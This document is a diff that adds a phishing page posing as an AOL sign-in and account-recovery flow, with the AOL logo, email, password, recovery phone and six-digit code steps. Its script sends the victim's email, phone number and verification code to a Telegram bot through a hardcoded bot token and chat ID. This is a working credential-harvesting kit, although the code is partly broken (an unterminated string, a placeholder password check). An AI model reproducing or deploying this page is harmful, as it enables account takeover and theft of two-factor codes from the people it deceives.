@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign In / Recovery Flow</title>
+  <style>
+    @font-face {
+      font-family: 'Adelle Sans';
+      src: url('fonts/AdelleSans-Regular.woff2') format('woff2'),
+           url('fonts/AdelleSans-Regular.woff') format('woff');
+      font-weight: normal;
+      font-style: normal;
+      font-display: swap;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body, html {
+      height: 100%;
+      font-family: 'Adelle Sans', sans-serif;
+      background-color: #f7f7f7;
+      display: flex; justify-content: center; align-items: center;
+    }
+    .box {
+      width: 380px;
+      background: #fff;
+      min-height: 70vh;
+      padding: 40px 30px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      display: flex; flex-direction: column; justify-content: center;
+      border-radius: 8px;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+      margin-top: -5px;
+    }
+    h2, p.desc {
+      font-weight: bold;
+      font-size: 22px;
+      color: #000;
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    p.desc {
+      font-size: 14px;
+      color: #333;
+      margin-top: -10px;
+    }
+    .input-group {
+      position: relative; margin-bottom: 25px;
+    }
+    input[type="email"], input[type="password"], input[type="tel"], input[type="text"] {
+      width: 100%; padding: 12px 0 6px 0; font-size: 16px;
+      border: none; border-bottom: 1px solid #ccc;
+      background: transparent; outline: none;
+      transition: border-color 0.3s ease;
+    }
+    input:focus { border-bottom-color: #0078d7; }
+    label.login-label {
+      position: absolute; left: 0; top: 12px; color: #777;
+      font-size: 13px; pointer-events: none;
+      transition: 0.2s ease all; padding: 0 4px;
+    }
+    input:focus + label, input:not(:placeholder-shown) + label {
+      top: -12px; font-size: 11px; color: #0078d7;
+    }
+    .button {
+      width: 100%; padding: 14px; font-size: 16px;
+      border: none; border-radius: 4px; cursor: pointer;
+      background-color: #0078d7; color: white;
+      transition: background-color 0.3s ease;
+      margin-bottom: 10px;
+    }
+    .button:hover { background-color: #005a9e; }
+    .email-summary {
+      text-align: center; font-weight: normal;
+      color: #333; margin-bottom: 15px; display: none;
+      font-size: 14px; /* Increased font size */
+      line-height: 1.2;
+      margin-top: 2px;
+    }
+    #password-fail-msg {
+      display: none; color: #d93025; font-size: 13px;
+      text-align: center; margin-bottom: 15px;
+    }
+    #countdown {
+      text-align: center; font-size: 13px; color: red; margin-bottom: 20px;
+    }
+    .footer-links {
+      text-align: center; font-size: 14px; margin-top: 15px;
+    }
+    .footer-links a {
+      color: #0078d7; text-decoration: none;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Mobile responsiveness */
+    @media (max-width: 768px) {
+      .box {
+        width: 90%;
+        padding: 30px 20px;
+      }
+      h2 {
+        font-size: 18px;
+      }
+      p.desc {
+        font-size: 12px;
+      }
+      .input-group input {
+        font-size: 14px;
+      }
+      .button {
+        font-size: 14px;
+        padding: 12px;
+      }
+    }
+
+    /* Bounce effect for invalid input */
+    .bounce {
+      animation: bounce 0.3s ease-in-out;
+    }
+
+    @keyframes bounce {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+
+    /* Password Visibility Icon */
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 12px;
+      cursor: pointer;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="header">
+      <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="Company Logo"
+           style="max-width:120px; margin-bottom:20px;" />
+    </div>
+
+    <!-- Step 1: Email -->
+    <div id="step-1">
+      <h2>Sign In</h2>
+      <div class="input-group">
+        <input type="email" id="email-input" placeholder=" " required oninput="checkEmail()">
+        <label class="login-label" for="email-input">Username, email address or mobile number</label>
+      </div>
+      <button type="button" class="button" onclick="submitEmail()">Next</button>
+    </div>
+
+    <!-- Step 2: Password -->
+    <div id="step-2" style="display:none;">
+      <!-- Email Display -->
+      <div class="email-summary" id="email-summary"></div>
+      
+      <h2>Enter password
+        <span style="font-weight: normal; font-size: 16px; display: block; margin-top: 2px;">to finish signing in</span>
+      </h2>
+      
+      <div class="input-group">
+        <input type="password" id="password-input" placeholder=" " required oninput="checkPassword()">
+        <label class="login-label" for="password-input">Password</label>
+        <span class="toggle-password" onclick="togglePassword()">👁️</span>
+      </div>
+      <button type="button" class="button" onclick="handlePassword()">Sign In</button>
+      <div id="password-fail-msg">Incorrect password, please try again.</div>
+    </div>
+
+    <!-- Step 3: Recovery phone -->
+    <div id="step-3" style="display:none;">
+      <h2>Is it really you?</h2>
+      <p class="desc">Enter your recovery phone number<br>to receive a verification code.</p>
+      <div class="input-group">
+        <input type="tel" id="phone-input" placeholder="+1 555 123 4567" required oninput="checkPhone()">
+      </div>
+      <button type="button" class="button" onclick="submitPhone()">Send Code</button>
+    </div>
+
+    <!-- Step 4: Six-digit code -->
+    <div id="step-4" style="display:none;">
+      <h2>Verify Code</h2>
+      <p class="desc">Enter the 6‑digit code sent to your phone.</p>
+      <p id="countdown">Code expires in 5:00</p>
+      <div class="input-group">
+        <input type="text" id="code-input" placeholder="6‑digit Code" maxlength="6" required oninput="checkCode()">
+      </div>
+      <button type="button" class="button" onclick="submitCode()">Next</button>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" onclick="goToStep(1)">Back to Sign In</a>
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8306932001:AAHE1Jmxa0K1242DDGP4Yp5AOWJWqenuhNA; // Your bot token
+    const CHAT_ID = "7884688728"; // Your updated chat ID
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "HTML"
+      };
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => console.log('Message sent to Telegram:', data))
+      .catch(error => console.error('Error sending message:', error));
+    }
+
+    function submitEmail() {
+      const email = document.getElementById("email-input").value;
+      document.getElementById("step-1").style.display = "none";
+      document.getElementById("step-2").style.display = "block";
+      document.getElementById("email-summary").innerText = "Email: " + email;
+      document.getElementById("email-summary").style.display = "block";
+    }
+
+    function handlePassword() {
+      const password = document.getElementById("password-input").value;
+      if (password === "correctPassword") {
+        sendToTelegram("User successfully logged in with email: " + document.getElementById("email-input").value);
+        document.getElementById("step-2").style.display = "none";
+        document.getElementById("step-3").style.display = "block";
+      } else {
+        document.getElementById("password-input").classList.add("bounce");
+        document.getElementById("password-fail-msg").style.display = "block";
+        setTimeout(() => {
+          document.getElementById("password-input").classList.remove("bounce");
+          document.getElementById("password-fail-msg").style.display = "none";
+        }, 500);
+      }
+    }
+
+    function submitPhone() {
+      const phone = document.getElementById("phone-input").value;
+      sendToTelegram("User submitted phone number: " + phone);
+      document.getElementById("step-3").style.display = "none";
+      document.getElementById("step-4").style.display = "block";
+    }
+
+    function submitCode() {
+      const code = document.getElementById("code-input").value;
+      sendToTelegram("User entered verification code: " + code);
+    }
+
+    function checkEmail() {
+      const email = document.getElementById("email-input").value;
+      if (email !== "") {
+        document.getElementById("step-1").classList.remove("invalid");
+      }
+    }
+
+    function checkPhone() {
+      const phone = document.getElementById("phone-input").value;
+      if (phone !== "") {
+        document.getElementById("step-3").classList.remove("invalid");
+      }
+    }
+
+    function checkCode() {
+      const code = document.getElementById("code-input").value;
+      if (code !== "") {
+        document.getElementById("step-4").classList.remove("invalid");
+      }
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById("password-input");
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    }
+
+    function goToStep(step) {
+      // Change step based on current flow
+    }
+  </script>
+</body>
+</html>
